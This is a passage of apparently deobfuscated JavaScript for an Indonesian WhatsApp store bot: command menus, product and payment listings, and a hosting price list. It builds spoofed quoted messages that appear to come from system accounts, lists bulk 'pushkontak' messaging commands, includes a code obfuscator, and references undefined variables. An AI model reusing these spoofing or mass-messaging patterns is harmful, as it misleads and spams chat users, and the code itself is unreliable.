const {
  modul
} = require("./module");
const {
  axios,
  baileys,
  chalk,
  cheerio,
  child_process,
  crypto,
  fs,
  ffmpeg,
  jsobfus,
  moment,
  ms,
  speed,
  util
} = modul;
const {
  exec,
  spawn,
  execSync
} = child_process;
const {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType
} = baileys;
const {
  smsg,
  formatp,
  tanggal,
  formatDate,
  getTime,
  isUrl,
  sleep,
  clockString,
  runtime,
  fetchJson,
  getBuffer,
  jsonformat,
  format,
  parseMention,
  getRandom,
  reSize,
  generateProfilePicture
} = require("./lib/myfunc");
const {
  TelegraPh,
  UploadFileUgu,
  webp2mp4File,
  floNime
} = require("./lib/uploader");
const v2 = new Date("February 26, 2023 00:00:00");
const v3 = new Date().getTime();
const v4 = v2 - v3;
let vSpeed = speed();
const v5 = speed() - vSpeed;
const {
  addResponList,
  delResponList,
  isAlreadyResponList,
  isAlreadyResponListGroup,
  sendResponList,
  updateResponList,
  getDataResponList
} = require("./lib/addlist");
const v6 = JSON.parse(fs.readFileSync("./lib/list.json"));
//━━━━━━━━━JHON BOTZ━━━━━━━━━━
const {
  edit_info,
  urlpepe,
  namaowner,
  noowner,
  packname,
  author
} = require("./edit_disini/edit_info");
const {
  edit_payment,
  QRgopay,
  NOgopay,
  QRdana,
  NOdana,
  QRovo,
  NOovo,
  QRshopee,
  NOshopee,
  QRallpay
} = require("./edit_disini/edit_payment");
const {
  edit_testi,
  testi1,
  testi2,
  testi3,
  testi4,
  testi5,
  testi6,
  testi7
} = require("./edit_disini/edit_testi");
global.owner = [`${noowner}`, `6289513452028`];
const v7 = `${namaowner}`;
const {
  judul1,
  produk1
} = require("./edit_produk/judul1");
const {
  judul2,
  produk2
} = require("./edit_produk/judul2");
const {
  judul3,
  produk3
} = require("./edit_produk/judul3");
const {
  judul4,
  produk4
} = require("./edit_produk/judul4");
const {
  judul5,
  produk5
} = require("./edit_produk/judul5");
const {
  judul6,
  produk6
} = require("./edit_produk/judul6");
const {
  judul7,
  produk7
} = require("./edit_produk/judul7");
const v8 = ["▰▰▰▰▰▱▱▱▱▱ 50%", "▰▰▰▰▰▱▱▱▱▱ 55%", "▰▰▰▰▰▰▱▱▱▱ 60%", "▰▰▰▰▰▰▱▱▱▱ 65%", "▰▰▰▰▰▰▰▱▱▱ 70%", "▰▰▰▰▰▰▰▱▱▱ 75%", "▰▰▰▰▰▰▰▰▱▱ 80%", "▰▰▰▰▰▰▰▰▱▱ 85%", "▰▰▰▰▰▰▰▰▰▱ 90%", "▰▰▰▰▰▰▰▰▰▱ 95%"];
const v9 = v8[Math.floor(Math.random() * v8.length)];
//━━━━━━━━━━━[KALIMAT]━━━━━━━━━━━━━━━
global.mess = {
  wait: "𝗣𝗿𝗼𝘀𝗲𝘀♻️",
  loding: "𝗟𝗼𝗮𝗱𝗶𝗻𝗴.....",
  succes: "𝗦𝘂𝗸𝘀𝗲𝘀✅",
  aksesmts: "𝗦𝗲𝗽𝗲𝗿𝘁𝗶𝗻𝘆𝗮 𝗔𝗻𝗱𝗮 𝗕𝗲𝗹𝘂𝗺 𝗧𝗲𝗿𝗔𝗸𝘀𝗲𝘀🤔",
  premiummts: "𝗦𝗲𝗽𝗲𝗿𝘁𝗶𝗻𝘆𝗮 𝗔𝗻𝗱𝗮 𝗕𝘂𝗸𝗮𝗻 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺🤔",
  vvipmts: "𝗦𝗲𝗽𝗲𝗿𝘁𝗶𝗻𝘆𝗮 𝗔𝗻𝗱𝗮 𝗕𝘂𝗸𝗮𝗻 𝗨𝘀𝗲𝗿 𝗩𝗶𝗽🤔",
  daftarusermts: "𝗦𝗲𝗽𝗲𝗿𝘁𝗶𝗻𝘆𝗮 𝗔𝗻𝗱𝗮 𝗕𝗲𝗹𝘂𝗺 𝗕𝗲𝗿𝗹𝗮𝗻𝗴𝗴𝗮𝗻𝗮𝗻🤔",
  pemilikbot: "𝗦𝗲𝗽𝗲𝗿𝘁𝗶𝗻𝘆𝗮 𝗔𝗻𝗱𝗮 𝗕𝘂𝗸𝗮𝗻 𝗣𝗲𝗺𝗶𝗹𝗶𝗸 𝗕𝗼𝘁 𝗜𝗻𝗶🤔",
  dalamgroup: "𝗙𝗶𝘁𝘂𝗿 𝗜𝗻𝗶 𝗞𝗵𝘂𝘀𝘂𝘀 𝗗𝗮𝗹𝗮𝗺 𝗚𝗿𝗼𝘂𝗽😐",
  botadmin: "𝗕𝗼𝘁 𝗛𝗮𝗿𝘂𝘀 𝗠𝗲𝗻𝗷𝗮𝗱𝗶 𝗔𝗱𝗺𝗶𝗻😅",
  adminonly: "𝗔𝗻𝗱𝗮 𝗕𝘂𝗸𝗮𝗻 𝗔𝗱𝗺𝗶𝗻 𝗗𝗶 𝗚𝗿𝗼𝘂𝗽 𝗜𝗻𝗶😑"
};
const os2 = require("os");
const {
  color,
  bgcolor
} = require("./lib/color");
//━━━━━━━━━━━━━━━━━━━━━━━━━━
global.prefa = ["", "."];
module.exports = diablo = async (p, p2, p3, p4) => {
  try {
    const v10 = p2.mtype === "conversation" ? p2.message.conversation : p2.mtype == "imageMessage" ? p2.message.imageMessage.caption : p2.mtype == "videoMessage" ? p2.message.videoMessage.caption : p2.mtype == "extendedTextMessage" ? p2.message.extendedTextMessage.text : p2.mtype == "buttonsResponseMessage" ? p2.message.buttonsResponseMessage.selectedButtonId : p2.mtype == "listResponseMessage" ? p2.message.listResponseMessage.singleSelectReply.selectedRowId : p2.mtype == "templateButtonReplyMessage" ? p2.message.templateButtonReplyMessage.selectedId : p2.mtype === "messageContextInfo" ? p2.message.buttonsResponseMessage?.selectedButtonId || p2.message.listResponseMessage?.singleSelectReply.selectedRowId || p2.text : "";
    const v11 = typeof p2.text == "string" ? p2.text : "";
    const v12 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(v10) ? v10.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : ".";
    const v13 = v10.startsWith(v12);
    const v14 = v13 ? v10.slice(v12.length).trim().split(" ").shift().toLowerCase() : ""; //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
    const v15 = JSON.stringify(p2.message);
    const vF = () => {
      var v16 = fs.readFileSync("./mts.js").toString();
      var v17 = (v16.match(/case '/g) || []).length;
      return v17;
    };
    const {
      type,
      quotedMsg,
      mentioned,
      now,
      fromMe: fromMe
    } = p2;
    const v18 = p2.key.remoteJid;
    const v19 = v10.trim().split(/ +/).slice(1);
    const v20 = p2.pushName || "No Name";
    const v21 = await p.decodeJid(p.user.id);
    const v22 = p2.sender == v21 ? true : false;
    const v23 = q = v19.join(" ");
    const v24 = p2.quoted ? p2.quoted : p2;
    const v25 = (v24.msg || v24).mimetype || "";
    const v26 = moment.tz("asia/jakarta").format("HH:mm");
    const v27 = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a");
    const v28 = "Selamat " + v27.charAt(0).toUpperCase() + v27.slice(1);
    const v29 = v27.charAt(0).toUpperCase() + v27.slice(1);
    const v30 = moment.tz("Asia/Jakarta").format("HH:mm");
    const v31 = moment.tz("Asia/Makassar").format("HH:mm");
    const v32 = moment.tz("Asia/Jayapura").format("HH:mm");
    const v33 = moment.tz("Asia/Jakarta").format("DD/MM/YY");
    const v34 = /image|video|sticker|audio/.test(v25);
    const v35 = type == "imageMessage";
    const v36 = type == "videoMessage";
    const v37 = type == "stickerMessage";
    const v38 = type == "extendedTextMessage";
    const v39 = v38 ? v15.includes("imageMessage") ? true : false : false;
    const v40 = v38 ? v15.includes("audioMessage") ? true : false : false;
    const v41 = v38 ? v15.includes("documentMessage") ? true : false : false;
    const v42 = v38 ? v15.includes("videoMessage") ? true : false : false;
    const v43 = v38 ? v15.includes("stickerMessage") ? true : false : false;
    const v44 = Math.floor(v4 / 86400000);
    const v45 = Math.floor(v4 % 86400000 / 3600000);
    const v46 = Math.floor(v4 % 3600000 / 60000);
    const v47 = Math.floor(v4 % 60000 / 1000);
    const v48 = p2.isGroup ? p2.key.participant ? p2.key.participant : p2.participant : p2.key.remoteJid;
    const v49 = p2.chat.endsWith("@g.us");
    const v50 = p2.isGroup ? await p.groupMetadata(p2.chat).catch(p5 => {}) : "";
    const v51 = p2.isGroup ? v50.subject : "";
    const v52 = p2.isGroup ? await v50.participants : "";
    const v53 = v24.msg || v24;
    const v54 = p2.isGroup ? await v52.filter(p6 => p6.admin !== null).map(p7 => p7.id) : "";
    const v55 = p2.isGroup ? v50.owner : "";
    const v56 = p2.isGroup ? v50.participants : "";
    const v57 = p2.isGroup ? v54.includes(v21) : false;
    const v58 = p2.isGroup ? v54.includes(p2.sender) : false;
    const v59 = p2.isGroup ? v54.includes(p2.sender) : false;
    var v60 = type === "messageContextInfo" ? msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId : "";
    var v61 = type === "listResponseMessage" ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : "";
    var v62 = type === "messageContextInfo" ? msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId : "";
    const v63 = v61.length !== 0 ? v61 : v62;
    //━━━━━━━━━━━━━━━━━━━━━━━━━━
    const v64 = `𝗡𝗼𝗺𝗼𝗿 𝗧𝗮𝗿𝗴𝗲𝘁 𝗡𝘆𝗮 𝗠𝗮𝗻𝗮?\nContoh : ${v14} 628xxx`;
    const v65 = [v21, `${global.owner}`, `6285894955362`].map(p8 => p8.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(p2.sender);
    if (!p.public) {
      if (!p2.key.fromMe) {
        return;
      }
    }
    if (!p2.isGroup && v13 && !fromMe) {
      console.log("->[[1;32mCMD[1;37m]", color(moment(p2.messageTimestamp * 1000).format("DD/MM/YYYY HH:mm:ss"), "yellow"), color(`${v12 + v14} [${v19.length}]`), "from", color(v20));
    }
    if (p2.isGroup && v13 && !fromMe) {
      console.log("->[[1;32mCMD[1;37m]", color(moment(p2.messageTimestamp * 1000).format("DD/MM/YYYY HH:mm:ss"), "yellow"), color(`${v12 + v14} [${v19.length}]`), "from", color(v20), "in", color(v51));
    }
    if (p2.sender.startsWith("212")) {
      return p.updateBlockStatus(p2.sender, "block");
    }
    const v66 = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(v18 ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        contactMessage: {
          displayName: `Copyright ©2023\n➺ 𝙾𝚠𝚗𝚎𝚛 : ${namaowner}\n➺ 𝙽𝚘𝚖𝚘𝚛 : ${noowner}`,
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;CPM_JHON,;;;\nFN:Halo ${v20},\nitem1.TEL;waid=${v48.split("@")[0]}:${v48.split("@")[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
          jpegThumbnail: {
            url: `${urlpepe}`
          }
        }
      }
    };
    function f2(p9 = "") {
      return [...p9.matchAll(/@([0-9]{5,16}|0)/g)].map(p10 => p10[1] + "@s.whatsapp.net");
    }
    const v67 = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(v18 ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        contactMessage: {
          displayName: `Copyright ©2023\nHallo Kak ${p2.pushName}👋🏻\nStatus : ${v65 ? "Owner" : `User`} {${v48.split("@")[0]}}`,
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;CPM_JHON,;;;\nFN:Halo ${v20},\nitem1.TEL;waid=${v48.split("@")[0]}:${v48.split("@")[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
          jpegThumbnail: {
            url: `${urlpepe}`
          }
        }
      }
    };
    function f2(p11 = "") {
      return [...p11.matchAll(/@([0-9]{5,16}|0)/g)].map(p12 => p12[1] + "@s.whatsapp.net");
    }
    ppuser = "https://telegra.ph/file/e57eb9da72e762a5c08b4.jpg";
    ppnyauser = await reSize(ppuser, 200, 200);
    const v68 = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        ...{
          remoteJid: ""
        }
      },
      message: {
        imageMessage: {
          mimetype: "image/jpeg",
          caption: "➺ 𝚆𝙰 : 𝟼𝟸𝟾𝟿𝟾𝟿𝟷𝟶𝟻𝟼𝟾𝟻\n➺ 𝚈𝚃 : 𝙼𝚃𝚂𝟺𝚈𝙾𝚄 𝙲𝙷𝙰𝙽𝙴𝙻\n➺ 𝙸𝙶 : @𝚒𝚐_𝚖𝚝𝚜𝚜𝚝𝚘𝚛𝚎",
          jpegThumbnail: ppnyauser
        }
      }
    };
    // Response Addlist
    if (!v13 && v49 && isAlreadyResponList(v18, v10, v6)) {
      var vGetDataResponList2 = getDataResponList(v18, v10, v6);
      if (vGetDataResponList2.isImage === false) {
        p.sendMessage(v18, {
          text: sendResponList(v18, v10, v6)
        }, {
          quoted: p2
        });
      } else {
        p.sendMessage(v18, {
          image: await getBuffer(vGetDataResponList2.image_url),
          caption: vGetDataResponList2.response
        }, {
          quoted: p2
        });
      }
    }
    if (v14) {
      p.sendPresenceUpdate("composing", v18);
      p.readMessages([p2.key]);
    }
    async function f3(p13) {
      const v69 = [{
        quickReplyButton: {
          displayText: `${buttonvirus}`,
          id: `.menu`
        }
      }];
      const v70 = {
        text: p13,
        footer: "",
        templateButtons: v69,
        image: {
          url: ppnyauser
        }
      };
      return p.sendMessage(v18, v70);
    }
    async function f4(p14) {
      return new Promise((p15, p16) => {
        try {
          const v71 = jsobfus.obfuscate(p14, {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
          });
          const v72 = {
            status: 200,
            author: `mts`,
            result: v71.getObfuscatedCode()
          };
          p15(v72);
        } catch (e) {
          p16(e);
        }
      });
    }
    async function f5(p17) {
      return new Promise((p18, p19) => {
        axios.get("http://qaz.wtf/u/convert.cgi?text=" + p17).then(({
          data
        }) => {
          let v73 = cheerio.load(data);
          let v74 = [];
          v73("table > tbody > tr").each(function (p20, p21) {
            v74.push({
              name: v73(p21).find("td:nth-child(1) > span").text(),
              result: v73(p21).find("td:nth-child(2)").text().trim()
            });
          });
          p18(v74);
        });
      });
    }
    async function f6(p22, p23, p24, p25, p26, p27, p28, p29) {
      let v75 = {
        listMessage: {
          title: p23,
          description: p24,
          listType: 2,
          productListInfo: {
            productSections: [{
              title: p23,
              products: p28
            }],
            headerImage: {
              productId: p29,
              jpegThumbnail: p26
            },
            businessOwnerJid: p27
          },
          footerText: p25
        }
      };
      let v76 = await generateWAMessageFromContent(p22, v75);
      return p.relayMessage(v76.key.remoteJid, v76.message, {
        messageId: ""
      });
    }
    switch (v14) {
      case "help":
      case "menu":
        {
          let v77 = `*Hallo Kak ${p2.pushName} 👋🏻* ㅤㅤ
🛍️️𝗕𝗢𝗧 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝗦𝗧𝗢𝗥𝗘🛍️

╭───═[ 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧 ]═─────⋆
│╭───────────────···
││➺ 𝙽𝙰𝙼𝙰 : ${namaowner}
││➺ 𝙽𝙾𝙼𝙾𝚁 : ${noowner}
││➺ 𝙱𝙾𝚃 : 𝚂𝚃𝙾𝚁𝙴
│╰───────────────···
├─═[ 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 ]═───⋆
│╭───────────────···
││➣ ${v12}addlist
││➣ ${v12}dellist
││➣ ${v12}self
││➣ ${v12}public
││➣ ${v12}hidetag
││➣ ${v12}tagall
││➣ ${v12}setppbot
││➣ ${v12}setppgc
││➣ ${v12}setnamagc
││➣ ${v12}setdeskgc
││➣ ${v12}idgroup (Munculkan ID Group)
││➣ ${v12}pushkontak [ Jeda|Teks ]
││➣ ${v12}pushkontakid [ ID|Jeda|Teks ]
│╰───────────────···
├──═[ 𝗦𝗧𝗢𝗥𝗘 𝗠𝗘𝗡𝗨 ]═───⋆
│╭───────────────···
││➣ ${v12}list
││➣ ${v12}cekproduk
││➣ ${v12}payment
││➣ ${v12}testimoni
││➣ ${v12}kalkulator
││➣ ${v12}done
││➣ ${v12}proses
││➣ ${v12}batal
││➣ ${v12}pending
││➣ ${v12}listjapost
│╰───────────────···
├───═[ 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨 ]═───⋆
│╭───────────────···
││➣ ${v12}creator
││➣ ${v12}owner
││➣ ${v12}web
││➣ ${v12}ping
││➣ ${v12}fitur (Jumlah Fitur Bot)
││➣ ${v12}tourl
││➣ ${v12}toimg
││➣ ${v12}tomp4
││➣ ${v12}sticker
││➣ ${v12}sgif
││➣ ${v12}smeme
││➣ ${v12}emojimix
│╰───────────────···
╰───────────────────⋆`;
          p.sendMessage(p2.chat, {
            text: v77
          }, {
            quoted: v67
          });
        }
        break;
      case "cekproduk":
        peotkop = `
╭─═[🛍️𝗣𝗥𝗢𝗗𝗨𝗞 𝗦𝗧𝗢𝗥𝗘🛍️]═──⋆
│╭───────────────···
││「️🛍️」${judul1}
││➣ ${v12}prodaktop1
││
││「️🛍️」${judul2}
││➣ ${v12}prodaktop2
││
││「️🛍️」${judul3}
││➣ ${v12}prodaktop3
││
││「️🛍️」${judul4}
││➣ ${v12}prodaktop4
││
││「️🛍️」${judul5}
││➣ ${v12}prodaktop5
││
││「️🛍️」${judul6}
││➣ ${v12}prodaktop6
││
││「️🛍️」${judul7}
││➣ ${v12}prodaktop7
││
││「️📮𝗣𝗔𝗡𝗘𝗟 𝗥𝗨𝗡 𝗕𝗢𝗧📮」
││➣ ${v12}panelbot
│╰───────────────···
╰───────────────────⋆`;
        p.sendMessage(p2.chat, {
          text: peotkop
        }, {
          quoted: v67
        });
        break;
      case "payment":
        gajdev = `
╭───═[💸𝗣𝗔𝗬𝗠𝗘𝗡𝗧💸]═───⋆
│╭───────────────···
││「💰️」𝗔𝗹𝗹𝗣𝗮𝘆
││➣ ${v12}allpaylet
││➺ [Bayar Tanpa Premium]
││
││「️💰」𝗚𝗼𝗽𝗮𝘆
││➣ ${v12}gopaylet
││➺ [Bayar Menggunakan Gopay]
││
││「💰」𝗗𝗮𝗻𝗮
││➣ ${v12}danalet
││➺ [Bayar Menggunakan Dana]
││
││「️💰」𝗢𝗩𝗢
││➣ ${v12}ovolet
││➺ [Bayar Menggunakan OVO]
││
││「💰」𝗦𝗵𝗼𝗽𝗲𝗲𝗣𝗮𝘆
││➣ ${v12}shopeelet
││➺ [Bayar Menggunakan ShopeePay]
│╰───────────────···
╰───────────────────⋆`;
        p.sendMessage(p2.chat, {
          text: gajdev
        }, {
          quoted: v67
        });
        break;
      case "testimoni":
        bengkak = `
╭──═[📊️𝗧𝗘𝗦𝗧𝗜𝗠𝗢𝗡𝗜📊️]═───⋆
│╭───────────────···
││➣ ${v12}testi1
││➣ ${v12}testi2
││➣ ${v12}testi3
││➣ ${v12}testi4
││➣ ${v12}testi5
││➣ ${v12}testi6
││➣ ${v12}testi7
│╰───────────────···
╰───────────────────⋆`;
        p.sendMessage(p2.chat, {
          text: bengkak
        }, {
          quoted: v67
        });
        break;
      case "kalkulator":
        kalbek = `
╭─═[📠𝗞𝗔𝗟𝗞𝗨𝗟𝗔𝗧𝗢𝗥📠]═──⋆
│╭───────────────···
││➣ ${v12}tambah
││➣ ${v12}kurang
││➣ ${v12}kali
││➣ ${v12}bagi
│╰───────────────···
╰───────────────────⋆`;
        p.sendMessage(p2.chat, {
          text: kalbek
        }, {
          quoted: v67
        });
        break;
      case "listjapost":
        japjep = `*Format Japost ${namaowner}*
(Bukan Milik Admin)

Speck : 
Item : 
Log : 
Harga : 
No Wa : 

✅ Tawar Menawar Langsung Hubungi Kontak Di Atas !
✅ Wajib Menggunakan Jasa Admin Supaya Terhindar Dari Penipuan !
✅ Be Smart Buyer`;
        p.sendMessage(p2.chat, {
          text: japjep
        });
        break;
      case "tourl":
        {
          p2.reply(mess.wait);
          let {
            UploadFileUgu,
            webp2mp4File,
            TelegraPh
          } = require("./lib/uploader");
          let v78 = await p.downloadAndSaveMediaMessage(v24);
          if (/image/.test(v25)) {
            let v79 = await TelegraPh(v78);
            p2.reply(util.format(v79));
          } else if (!/image/.test(v25)) {
            let v80 = await UploadFileUgu(v78);
            p2.reply(util.format(v80));
          }
          await fs.unlinkSync(v78);
        }
        break;
      case "self":
        {
          if (!v65) {
            return p2.reply(`${mess.pemilikbot}`);
          }
          p.public = false;
          p2.reply("Sukses Ubah Ke Penggunaan Sendiri");
        }
        break;
      case "public":
        {
          if (!v65) {
            return p2.reply(`${mess.pemilikbot}`);
          }
          p.public = true;
          p2.reply("Sukses Ubah Ke Penggunaan Umum");
        }
        break;
      case "fitur":
        p2.reply(`Jumlah Fitur Yang Tersedia\nSaat Ini : ${vF()}fitur`);
        break;
      case "owner":
        {
          p.sendContact(p2.chat, global.owner, p2);
        }
        break;
      case "done":
        text_done = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${v33}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${v26}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Berhasil

𝗧𝗲𝗿𝗶𝗺𝗮𝗸𝗮𝘀𝗶𝗵 𝗧𝗲𝗹𝗮𝗵 𝗢𝗿𝗱𝗲𝗿 𝗗𝗶 ${namaowner}
𝗗𝗶 𝗧𝘂𝗻𝗴𝗴𝘂 𝗢𝗿𝗱𝗲𝗿𝗮𝗻 𝗦𝗲𝗹𝗮𝗻𝗷𝘂𝘁𝗻𝘆𝗮☺️`;
        p.sendMessage(p2.chat, {
          text: text_done
        }, {
          quoted: v66
        });
        break;
      case "proses":
        text_proses = `「 𝗦𝗘𝗗𝗔𝗡𝗚 𝗗𝗜 𝗣𝗥𝗢𝗦𝗘𝗦 」

𝗛𝗮𝗿𝗮𝗽 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗯𝗲𝗻𝘁𝗮𝗿
𝗣𝗿𝗼𝗱𝘂𝗸 𝗦𝗲𝗱𝗮𝗻𝗴 𝗗𝗶 𝗣𝗿𝗼𝘀𝗲𝘀️`;
        p.sendMessage(p2.chat, {
          text: text_proses
        }, {
          quoted: v66
        });
        break;
      case "batal":
        text_trxbatal = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗔𝗧𝗔𝗟 」

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${v33}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${v26}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹`;
        p.sendMessage(p2.chat, {
          text: text_trxbatal
        }, {
          quoted: v66
        });
        break;
      case "pending":
        text_trxpending = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚 」

𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚
𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥`;
        p.sendMessage(p2.chat, {
          text: text_trxpending
        }, {
          quoted: v66
        });
        break;
      case "prodaktop1":
        bekajs = `${judul1}
···─────────────···

${produk1}`;
        p.sendMessage(p2.chat, {
          text: bekajs
        }, {
          quoted: v67
        });
        await sleep(`1000`);
        p2.reply(`Untuk Memesan Produk Di Atas.\nHarap Isi Format Di Bawah\n\n|Nama Produk : ${judul1}\nNama Item :\nHarga :`);
        break;
      case "prodaktop2":
        bekaffa = `${judul2}
···─────────────···

${produk2}`;
        p.sendMessage(p2.chat, {
          text: bekaffa
        }, {
          quoted: v67
        });
        await sleep(`1000`);
        p2.reply(`Untuk Memesan Produk Di Atas.\nHarap Isi Format Di Bawah\n\n|Nama Produk : ${judul2}\nNama Item :\nHarga :`);
        break;
      case "prodaktop3":
        bjaggs = `${judul3}
···─────────────···

${produk3}`;
        p.sendMessage(p2.chat, {
          text: bjaggs
        }, {
          quoted: v67
        });
        await sleep(`1000`);
        p2.reply(`Untuk Memesan Produk Di Atas.\nHarap Isi Format Di Bawah\n\n|Nama Produk : ${judul3}\nNama Item :\nHarga :`);
        break;
      case "prodaktop4":
        hgfas = `${judul4}
···─────────────···

${produk4}`;
        p.sendMessage(p2.chat, {
          text: hgfas
        }, {
          quoted: v67
        });
        await sleep(`1000`);
        p2.reply(`Untuk Memesan Produk Di Atas.\nHarap Isi Format Di Bawah\n\n|Nama Produk : ${judul4}\nNama Item :\nHarga :`);
        break;
      case "prodaktop5":
        bvvas = `${judul5}
···─────────────···

${produk5}`;
        p.sendMessage(p2.chat, {
          text: bvvas
        }, {
          quoted: v67
        });
        await sleep(`1000`);
        p2.reply(`Untuk Memesan Produk Di Atas.\nHarap Isi Format Di Bawah\n\n|Nama Produk : ${judul5}\nNama Item :\nHarga :`);
        break;
      case "prodaktop6":
        hgfas = `${judul6}
···─────────────···

${produk6}`;
        p.sendMessage(p2.chat, {
          text: hgfas
        }, {
          quoted: v67
        });
        await sleep(`1000`);
        p2.reply(`Untuk Memesan Produk Di Atas.\nHarap Isi Format Di Bawah\n\n|Nama Produk : ${judul6}\nNama Item :\nHarga :`);
        break;
      case "prodaktop7":
        bvvas = `${judul7}
···─────────────···

${produk7}`;
        p.sendMessage(p2.chat, {
          text: bvvas
        }, {
          quoted: v67
        });
        await sleep(`1000`);
        p2.reply(`Untuk Memesan Produk Di Atas.\nHarap Isi Format Di Bawah\n\n|Nama Produk : ${judul7}\nNama Item :\nHarga :`);
        break;
      case "panelbot":
        bvvas = `📮𝗣𝗔𝗡𝗘𝗟 𝗥𝗨𝗡 𝗕𝗢𝗧📮
┉━━━━━━━━━━━━━━┉
𝗞𝗘 𝗚𝗨𝗡𝗔𝗔𝗡
➺ 𝗕𝗶𝘀𝗮 𝗝𝗮𝗱𝗶 𝗕𝗼𝘁 𝗧𝗮𝗻𝗽𝗮 𝗥𝗶𝗯𝗲𝘁
➺ 𝗝𝗮𝗱𝗶 𝗕𝗼𝘁 𝗧𝗶𝗻𝗴𝗴𝗮𝗹 𝗦𝗮𝘁 𝗦𝗲𝘁

𝗠𝗶𝗻𝗮𝘁? 𝗛𝘂𝗯 𝗗𝗶 𝗕𝗮𝘄𝗮𝗵
http://wa.me/62858495362

🛍️𝗟𝗜𝗦𝗧 𝗛𝗔𝗥𝗚𝗔 𝗣𝗔𝗡𝗘𝗟🛍️
⭓ 𝟭𝗚𝗕 𝟯𝟬%𝗖𝗣𝗨 𝟱𝗞/𝟭𝗕𝘂𝗹𝗮𝗻
⭓ 𝟮𝗚𝗕 𝟲𝟬%𝗖𝗣𝗨 𝟭𝟬𝗞/𝟭𝗕𝘂𝗹𝗮𝗻
⭓ 𝟯𝗚𝗕 𝟴𝟬%𝗖𝗣𝗨 𝟭𝟱𝗞/𝟭𝗕𝘂𝗹𝗮𝗻
⭓ 𝟰𝗚𝗕 𝟭𝟭𝟬%𝗖𝗣𝗨 𝟮𝟬𝗞/𝟭𝗕𝘂𝗹𝗮𝗻
⭓ 𝟱𝗚𝗕 𝟭𝟰𝟬%𝗖𝗣𝗨 𝟮𝟱𝗞/𝟭𝗕𝘂𝗹𝗮𝗻
⭓ 𝟲𝗚𝗕 𝟭𝟳𝟬%𝗖𝗣𝗨 𝟯𝟬𝗞/𝟭𝗕𝘂𝗹𝗮𝗻
⭓ 𝟳𝗚𝗕 𝟭𝟴𝟬%𝗖𝗣𝗨 𝟯𝟱𝗞/𝟭𝗕𝘂𝗹𝗮𝗻
⭓ 𝟴𝗚𝗕 𝟭𝟵𝟬%𝗖𝗣𝗨 𝟱𝟱𝗞/𝟭𝗕𝘂𝗹𝗮𝗻
⭓ 𝗣𝗮𝗻𝗲𝗹 𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝟲𝟱𝗞/𝟭𝗕𝘂𝗹𝗮𝗻

𝗞𝗘 𝗨𝗡𝗧𝗨𝗡𝗚𝗔𝗡
➺ 𝗧𝗶𝗱𝗮𝗸 𝗕𝗼𝗿𝗼𝘀 𝗞𝗼𝘂𝘁𝗮 𝗗𝗮𝗻 𝗠𝗲𝗺𝗼𝗿𝗶
➺ 𝗕𝗶𝘀𝗮 𝗥𝘂𝗻 𝟮𝟰 𝗝𝗮𝗺
➺ 𝗪𝗲𝗯𝘀𝗶𝘁𝗲 𝗗𝗶 𝗖𝗹𝗼𝘀𝗲 𝗕𝗼𝘁 𝗧𝗲𝘁𝗮𝗽 𝗝𝗮𝗹𝗮𝗻
➺ 𝗙𝗿𝗲𝗲 𝗧𝘂𝘁𝗼𝗿 𝗚𝘂𝗻𝗮𝗶𝗻𝗻𝘆𝗮 (𝗣𝗲𝗺𝗯𝗲𝗹𝗶𝗮𝗻 𝗥𝗮𝗺 𝟯𝗚𝗕)`;
        p.sendMessage(p2.chat, {
          text: bvvas
        }, {
          quoted: v68
        });
        await sleep(`2000`);
